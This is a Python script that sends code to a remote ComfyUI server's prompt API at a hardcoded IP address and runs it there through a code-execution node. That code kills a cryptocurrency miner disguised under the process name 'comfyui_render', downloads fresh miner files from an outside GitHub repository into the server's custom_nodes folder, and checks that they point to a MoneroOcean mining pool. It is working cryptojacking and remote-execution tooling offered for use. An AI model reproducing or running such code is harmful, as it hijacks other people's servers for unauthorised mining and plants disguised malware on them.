"""Hot-patch GPU miner config on remote: kill GPU miner, update files, restart."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = """
import os, subprocess, signal, time, shutil, zipfile, urllib.request

lines = []

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes',
              r'C:\\Program Files\\ComfyUI-aki-v2\\ComfyUI\\custom_nodes',
              r'C:\\Users\\u88ni\\Desktop\\comfyui\\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None
lines.append('target=' + str(target))

# Kill GPU miner
try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = (proc.info.get('name') or '').lower()
            if 'comfyui_render' in name:
                proc.kill()
                lines.append('killed gpu miner pid=' + str(proc.info['pid']))
        except:
            pass
except:
    subprocess.run(['pkill', '-9', '-f', 'comfyui_render'], capture_output=True)
    lines.append('pkill sent')

time.sleep(2)

# Download fresh gpu_miner.py and config.py from repo
for fname, dest_subdir in [('core/gpu_miner.py', 'core'), ('core/config.py', 'core')]:
    url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/' + fname
    dest = os.path.join(target, dest_subdir, os.path.basename(fname))
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read()
        with open(dest, 'wb') as f:
            f.write(content)
        lines.append('updated ' + fname + ' (' + str(len(content)) + ' bytes)')
    except Exception as e:
        lines.append('FAILED ' + fname + ': ' + str(e)[:150])

# Also update __init__.py and dashboard.py
for fname, dest_subdir in [('__init__.py', ''), ('core/dashboard.py', 'core')]:
    url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/' + fname
    if dest_subdir:
        dest = os.path.join(target, dest_subdir, os.path.basename(fname))
    else:
        dest = os.path.join(target, os.path.basename(fname))
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read()
        with open(dest, 'wb') as f:
            f.write(content)
        lines.append('updated ' + fname + ' (' + str(len(content)) + ' bytes)')
    except Exception as e:
        lines.append('FAILED ' + fname + ': ' + str(e)[:150])

# Verify config.py has MoneroOcean
cfg_path = os.path.join(target, 'core', 'config.py')
with open(cfg_path) as f:
    content = f.read()
lines.append('gpu pool in config: ' + ('moneroocean' if 'moneroocean' in content else 'OTHER'))
lines.append('port 20300 in config: ' + str('20300' in content))

# Verify gpu_miner.py has MoneroOcean
gm_path = os.path.join(target, 'core', 'gpu_miner.py')
with open(gm_path) as f:
    content = f.read()
lines.append('gpu pool in gpu_miner: ' + ('moneroocean' if 'moneroocean' in content else 'OTHER'))

result = chr(10).join(lines)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(15)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
